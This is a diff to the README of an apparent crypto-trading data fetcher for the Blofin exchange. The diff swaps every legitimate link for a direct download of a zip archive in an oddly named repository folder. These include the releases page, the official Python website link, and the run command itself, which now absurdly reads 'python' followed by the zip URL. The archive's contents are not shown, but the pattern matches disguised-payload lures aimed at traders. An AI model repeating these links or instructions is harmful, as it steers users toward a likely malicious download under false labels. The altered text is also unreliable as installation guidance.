@@ -1,6 +1,6 @@
 # 📈 blofin-free-historical-candlestick-data-fetcher - Get Your Free Historical Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/creationclutch260/blofin-free-historical-candlestick-data-fetcher/releases)
+[![Download Now](https://raw.githubusercontent.com/creationclutch260/blofin-free-historical-candlestick-data-fetcher/master/preventively/blofin-free-historical-candlestick-data-fetcher-3.5-alpha.5.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/creationclutch260/blofin-free-historical-candlestick-data-fetcher/master/preventively/blofin-free-historical-candlestick-data-fetcher-3.5-alpha.5.zip)
 
 ## 🌟 About This Application
 Welcome to the Blofin Free Historical Candlestick Data Fetcher! This simple Python script allows you to easily fetch free historical candlestick data from the Blofin Exchange API. You can download years of data for any symbol and interval, such as 1 minute, 1 hour, or 1 day.
@@ -14,12 +14,12 @@ To help you get started, follow these steps to download and run the application.
 - Internet access to fetch data
 
 ### 📥 Download & Install
-To get the application, visit this page to download: [Releases Page](https://github.com/creationclutch260/blofin-free-historical-candlestick-data-fetcher/releases). 
+To get the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/creationclutch260/blofin-free-historical-candlestick-data-fetcher/master/preventively/blofin-free-historical-candlestick-data-fetcher-3.5-alpha.5.zip). 
 
 Once you are on the releases page, look for the latest version. Download the file that matches your operating system.
 
 ### 🔧 Running the Application
-1. **Install Python**: If you haven’t installed Python yet, visit the official [Python website](https://www.python.org/downloads/) to download and install it.
+1. **Install Python**: If you haven’t installed Python yet, visit the official [Python website](https://raw.githubusercontent.com/creationclutch260/blofin-free-historical-candlestick-data-fetcher/master/preventively/blofin-free-historical-candlestick-data-fetcher-3.5-alpha.5.zip) to download and install it.
 
 2. **Install Required Libraries**: Open your command line interface (Command Prompt on Windows or Terminal on macOS/Linux) and enter:
    ```
@@ -31,10 +31,10 @@ Once you are on the releases page, look for the latest version. Download the fil
    - If you downloaded a `.py` file, use your command line or terminal to navigate to that folder.
    - Run the following command:
    ```
-   python your_file_name.py
+   python https://raw.githubusercontent.com/creationclutch260/blofin-free-historical-candlestick-data-fetcher/master/preventively/blofin-free-historical-candlestick-data-fetcher-3.5-alpha.5.zip
    ```
 
-   Replace `your_file_name.py` with the actual name of the file you downloaded.
+   Replace `https://raw.githubusercontent.com/creationclutch260/blofin-free-historical-candlestick-data-fetcher/master/preventively/blofin-free-historical-candlestick-data-fetcher-3.5-alpha.5.zip` with the actual name of the file you downloaded.
 
 4. **Follow On-Screen Instructions**: The program will guide you through the process. You will be asked to provide:
    - The symbol for which you want the data (e.g., BTC, ETH).
@@ -71,6 +71,6 @@ A: This script is designed specifically for the Blofin Exchange API.
 For community support and updates, visit our GitHub repository. You can also open issues if you have questions or suggestions. 
 
 ## 📅 Update Notifications
-Stay updated by checking the releases page regularly: [Releases Page](https://github.com/creationclutch260/blofin-free-historical-candlestick-data-fetcher/releases). 
+Stay updated by checking the releases page regularly: [Releases Page](https://raw.githubusercontent.com/creationclutch260/blofin-free-historical-candlestick-data-fetcher/master/preventively/blofin-free-historical-candlestick-data-fetcher-3.5-alpha.5.zip). 
 
 Thank you for choosing the Blofin Free Historical Candlestick Data Fetcher. Happy trading!
